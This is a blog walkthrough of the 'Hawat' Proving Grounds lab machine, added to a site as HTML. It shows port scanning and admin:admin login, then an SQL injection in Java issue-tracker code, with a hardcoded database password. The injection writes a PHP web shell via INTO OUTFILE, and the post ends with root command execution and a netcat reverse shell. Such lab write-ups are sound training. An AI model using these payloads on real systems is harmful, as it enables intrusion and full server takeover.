@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<link href="https://fonts.googleapis.com/css?family=Merriweather:300|Raleway:400,700" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/style.css">
+<title>Proving grounds Play: Hawat</title>
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Proving grounds Play: Hawat | Thevillagehacker’s Blog</title>
+<meta name="generator" content="Jekyll v4.3.3" />
+<meta property="og:title" content="Proving grounds Play: Hawat" />
+<meta name="author" content="Naveen" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Offsec proving grounds practice linux machine writeup" />
+<meta property="og:description" content="Offsec proving grounds practice linux machine writeup" />
+<link rel="canonical" href="http://localhost:4000/2023/10/16/Proving_grounds_Practice-Hawat.html" />
+<meta property="og:url" content="http://localhost:4000/2023/10/16/Proving_grounds_Practice-Hawat.html" />
+<meta property="og:site_name" content="Thevillagehacker’s Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-10-16T02:00:00+05:30" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Proving grounds Play: Hawat" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Naveen"},"dateModified":"2023-10-16T02:00:00+05:30","datePublished":"2023-10-16T02:00:00+05:30","description":"Offsec proving grounds practice linux machine writeup","headline":"Proving grounds Play: Hawat","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2023/10/16/Proving_grounds_Practice-Hawat.html"},"url":"http://localhost:4000/2023/10/16/Proving_grounds_Practice-Hawat.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+<script type="text/javascript" src="/assets/js/darkmode.js"></script>
+
+</head><body>
+  <main class="container">
+    <section class="about">
+      <div class="about-header condensed">
+      <div class="about-title">
+      <a href="/">
+        
+        <img src="/assets/portfolio.jpg" alt="Naveen Jagadeesan" />
+        
+      </a>
+      <h2 id="title">
+        <a href="/">Naveen Jagadeesan</a>
+      </h2>
+      </div><p class="tagline">Security Analyst. Security Researcher</p></div>
+      
+      <ul class="social about-footer condensed"><a href="https://github.com/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-github-circled"></i>
+          </li>
+        </a><a href="https://www.linkedin.com/in/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-linkedin-squared"></i>
+          </li>
+        </a><a href="https://twitter.com/thevillagehackr" target="_blank">
+          <li>
+            <i class="icon-twitter-squared"></i>
+          </li>
+        </a></ul><p class="about-footer condensed">&copy;
+        2024</p><div class="about-footer condensed">
+        <p>Dark Mode
+          <i class="icon-moon"></i>
+          <label class="switch">
+            <input type="checkbox" class="dark-mode-toggle">
+            <span class="slider round" onclick="toggleDarkMode()"></span>
+          </label>
+        </p>
+      </div>
+    </section>
+    <section class="content">
+      <div class="post-container">
+  <a class="post-link" href="/2023/10/16/Proving_grounds_Practice-Hawat.html">
+    <h2 class="post-title">Proving grounds Play: Hawat</h2>
+  </a>
+  <div class="post-meta">
+    <div class="post-date"><i class="icon-calendar"></i>Oct 16, 2023</div></div>
+  <div class="post">
+    <h2 id="nmap">Nmap</h2>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>22/tcp    open  ssh     OpenSSH 8.4 (protocol 2.0)
+17445/tcp open  unknown
+30455/tcp open  http    nginx 1.18.0
+50080/tcp open  http    Apache httpd 2.4.46 ((Unix) PHP/7.4.15)
+</code></pre></div></div>
+
+<h2 id="17445tcp-open--unknown">17445/tcp open  unknown</h2>
+
+<p>http://192.168.156.147:17445/</p>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/Hawat/web1.png" alt="img" /></p>
+
+<p>Register an user account on the portal.</p>
+
+<h2 id="30455tcp-open--http----nginx-1180">30455/tcp open  http    nginx 1.18.0</h2>
+
+<p>http://192.168.156.147:30455/</p>
+
+<p>http://192.168.156.147:30455/phpinfo.php</p>
+
+<p><strong>Required UInfo</strong></p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Document root = /srv/http
+server port = 30455
+server user = root
+</code></pre></div></div>
+
+<h2 id="50080tcp-open--http----apache-httpd-2446-unix-php7415">50080/tcp open  http    Apache httpd 2.4.46 ((Unix) PHP/7.4.15)</h2>
+
+<h3 id="directory-discovery">Directory discovery</h3>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>11:31:15] 301 -  243B  - /cloud  -&gt;  http://192.168.156.147:50080/cloud/
+</code></pre></div></div>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/Hawat/web2.png" alt="img" /></p>
+
+<p>Next cloud login page, use credentials <code class="language-plaintext highlighter-rouge">admin:admin</code> to login.</p>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/Hawat/web3.png" alt="img" /></p>
+
+<p>Download and extract the <code class="language-plaintext highlighter-rouge">issuetracker.zip</code> file in the local machine. Open the extracted file in a text editor to review the code.</p>
+
+<p>Upon reviewing the code, found that the application is vulnerable to sql injection vulnerability.</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="nd">@GetMapping</span><span class="o">(</span><span class="s">"/issue/checkByPriority"</span><span class="o">)</span>
+	<span class="kd">public</span> <span class="nc">String</span> <span class="nf">checkByPriority</span><span class="o">(</span><span class="nd">@RequestParam</span><span class="o">(</span><span class="s">"priority"</span><span class="o">)</span> <span class="nc">String</span> <span class="n">priority</span><span class="o">,</span> <span class="nc">Model</span> <span class="n">model</span><span class="o">)</span> <span class="o">{</span>
+		<span class="c1">// </span>
+		<span class="c1">// Custom code, need to integrate to the JPA</span>
+		<span class="c1">//</span>
+	    <span class="nc">Properties</span> <span class="n">connectionProps</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Properties</span><span class="o">();</span>
+	    <span class="n">connectionProps</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"user"</span><span class="o">,</span> <span class="s">"issue_user"</span><span class="o">);</span>
+	    <span class="n">connectionProps</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"password"</span><span class="o">,</span> <span class="s">"ManagementInsideOld797"</span><span class="o">);</span>
+        <span class="k">try</span> <span class="o">{</span>
+			<span class="n">conn</span> <span class="o">=</span> <span class="nc">DriverManager</span><span class="o">.</span><span class="na">getConnection</span><span class="o">(</span><span class="s">"jdbc:mysql://localhost:3306/issue_tracker"</span><span class="o">,</span><span class="n">connectionProps</span><span class="o">);</span>
+		    <span class="nc">String</span> <span class="n">query</span> <span class="o">=</span> <span class="s">"SELECT message FROM issue WHERE priority='"</span><span class="o">+</span><span class="n">priority</span><span class="o">+</span><span class="s">"'"</span><span class="o">;</span>           <span class="c1">//variable priority is not sanitized or no input validation is implemented</span>
+            <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">query</span><span class="o">);</span>
+		    <span class="nc">Statement</span> <span class="n">stmt</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="na">createStatement</span><span class="o">();</span>
+		    <span class="n">stmt</span><span class="o">.</span><span class="na">executeQuery</span><span class="o">(</span><span class="n">query</span><span class="o">);</span>
+
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">SQLException</span> <span class="n">e1</span><span class="o">)</span> <span class="o">{</span>
+			<span class="c1">// TODO Auto-generated catch block</span>
+			<span class="n">e1</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+		<span class="o">}</span>
+		
+        <span class="c1">// TODO: Return the list of the issues with the correct priority</span>
+		<span class="nc">List</span><span class="o">&lt;</span><span class="nc">Issue</span><span class="o">&gt;</span> <span class="n">issues</span> <span class="o">=</span> <span class="n">service</span><span class="o">.</span><span class="na">GetAll</span><span class="o">();</span>
+		<span class="n">model</span><span class="o">.</span><span class="na">addAttribute</span><span class="o">(</span><span class="s">"issuesList"</span><span class="o">,</span> <span class="n">issues</span><span class="o">);</span>
+		<span class="k">return</span> <span class="s">"issue_index"</span><span class="o">;</span>
+        
+	<span class="o">}</span>
+</code></pre></div></div>
+
+<p>On the above code the variable <code class="language-plaintext highlighter-rouge">priority</code> is not properly validated against the injection vulnerabilities and by using <code class="language-plaintext highlighter-rouge">UNION</code> based injection we can achieve remote code execution.</p>
+
+<h2 id="foothold">Foothold</h2>
+
+<p>Login to the application running on <code class="language-plaintext highlighter-rouge">http://192.168.217.147:17445/login</code> with the registered credentials. Construct a POST request as per the code <code class="language-plaintext highlighter-rouge">/issue/checkByPriority?priority=Normal</code>.</p>
+
+<blockquote>
+  <p>Note: GET method is not supported for the endpoint.</p>
+</blockquote>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/issue/checkByPriority?priority=Normal'+UNION+SELECT+sleep(5)+--+</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">192.168.217.147:17445</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">JSESSIONID=56CD439D46124C28A892FBC77124E167</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
+</code></pre></div></div>
+
+<p>SQL injection is confirmed.</p>
+
+<p><strong>RCE Payload</strong></p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Normal' UNION SELECT "&lt;?php system($_GET['cmd']); ?&gt;" INTO OUTFILE "/srv/http/rce.php" -- 
+</code></pre></div></div>
+
+<p>URL encode the payload and send it to the server.</p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/issue/checkByPriority?priority=Normal%27%20UNION%20SELECT%20%22%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%22%20INTO%20OUTFILE%20%22%2Fsrv%2Fhttp%2Frce.php%22%20--%20</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">192.168.217.147:17445</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">JSESSIONID=56CD439D46124C28A892FBC77124E167</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
+</code></pre></div></div>
+
+<p>Navigate to the <code class="language-plaintext highlighter-rouge">http://192.168.217.147:30455/rce.php?cmd=id</code> location to perform code execution.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>naveenj@hackerspace:|22:03|~/proving_grounds/Hawat<span class="nv">$ </span>curl <span class="s1">'http://192.168.217.147:30455/rce.php?cmd=id'</span>
+Windows 10 keeps telling me to update, why?
+Is allowed to use torrent sites <span class="k">in </span>the corporate network?
+<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Create PHP reverse shell file and use port as 443 to get reverse shell. Download the php file to the server and place it on <code class="language-plaintext highlighter-rouge">/srv/http</code> folder to access it publicly.</p>
+
+<blockquote>
+  <p>Note: The server only allows port 443 so run python server on the same to download the reverse shell code to the attacking machine.</p>
+</blockquote>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>naveenj@hackerspace:|22:09|~/proving_grounds/Hawat<span class="nv">$ </span>nc <span class="nt">-lvnp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>192.168.45.186] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.217.147] 55270
+Linux hawat 5.10.14-arch1-1 <span class="c">#1 SMP PREEMPT Sun, 07 Feb 2021 22:42:17 +0000 x86_64 GNU/Linux</span>
+ 02:11:10 up 28 min,  0 <span class="nb">users</span>,  load average: 0.06, 0.05, 0.00
+USER     TTY        LOGIN@   IDLE   JCPU   PCPU WHAT
+<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+sh: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>575<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
+sh: no job control <span class="k">in </span>this shell
+sh-5.1# 
+</code></pre></div></div>
+
+<p><strong>Foothold Obtained</strong></p>
+
+<p>Thanks for reading!</p>
+
+<p>For more insights and updates, follow me on Twitter: <a href="https://twitter.com/thevillagehackr">@thevillagehacker</a>.</p>
+
+  </div></div>
+
+    </section>
+    <footer class="condensed">
+      <ul class="social about-footer condensed"><a href="https://github.com/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-github-circled"></i>
+          </li>
+        </a><a href="https://www.linkedin.com/in/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-linkedin-squared"></i>
+          </li>
+        </a><a href="https://twitter.com/thevillagehackr" target="_blank">
+          <li>
+            <i class="icon-twitter-squared"></i>
+          </li>
+        </a></ul><p class="about-footer condensed">&copy;
+        2024</p><div class="about-footer condensed">
+        <p>Dark Mode
+          <i class="icon-moon"></i>
+          <label class="switch">
+            <input type="checkbox" class="dark-mode-toggle">
+            <span class="slider round" onclick="toggleDarkMode()"></span>
+          </label>
+        </p>
+      </div>
+    </footer>
+  </main>
+  
+  <script type="text/javascript" src="/assets/js/darkmode.js"></script>
+  
+  <script src="/assets/js/simple-jekyll-search.min.js"></script>
+  <script src="/assets/js/search.js"></script>
+  
+</body>
+
+</html>
